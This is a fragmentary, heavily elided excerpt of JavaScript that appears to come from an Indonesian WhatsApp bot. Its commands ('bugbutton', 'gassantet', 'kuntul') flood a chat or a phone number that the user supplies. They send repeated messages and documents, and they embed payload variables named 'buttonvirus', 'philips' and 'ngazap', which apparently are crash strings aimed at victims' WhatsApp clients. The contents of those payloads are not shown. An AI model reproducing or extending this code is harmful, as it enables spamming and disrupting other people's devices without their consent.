...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = '``🔥 ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ 🔥``',
hisoka.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${jobot}`,body: '🔥 ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case 'kuntul': {
...
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ 🔥 ${doc}.mp3`, quoted: m})
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ 🔥 ${jobot}.txt`, quoted: m})
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ 🔥 ${ngazap}.js`, quoted: m})
}
}
break
case 'bugbutton':{
...
if (!isCreator) return
                    a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await hisoka.sendMessage(m.chat, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻ "}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"}, {quoted: a})
...
reply(m.chat, `© 𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻`, main)
}
}
break
//=================================================//
...
thejobot(m.chat, `© 𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻`, main)
}
}
break
//=================================================//
...
review(m.chat, `© 𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻`, main)
}
}
break
//=================================================//
...
thejo(m.chat, `© 𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻`, main)
}
}
break
//=================================================//
...
bacit(m.chat, `© 𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻`, main)
}
}
break
//=================================================//
...
bacito(m.chat, `© 𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻`, main)
}
}
break
//=================================================//
...
bacot(m.chat, `© 𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻`, main)
}
}
break
...
for (let i = 0; i < jumlah; i++) {
  ...
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
          ...
          if (!text) throw `Nomernya mana?`
            ...
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"},{quoted:asukonyol11})
        ...
        case 'gassantet': {          
          ...
          if (!text) throw `Nomernya mana?`
            ...
            await hisoka.sendMessage(m.chat, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻"},{quoted:asukonyol11})
...
a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
	...
	"message": ` 😈𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻ ${philips} ${ngazap(prefix)}`,
...
"description": `© 𝐖𝐑𝐀𝐍𝐙 𝐓𝐇𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘⿻ ${buttonvirus}`,
"currencyCode": "IDR",
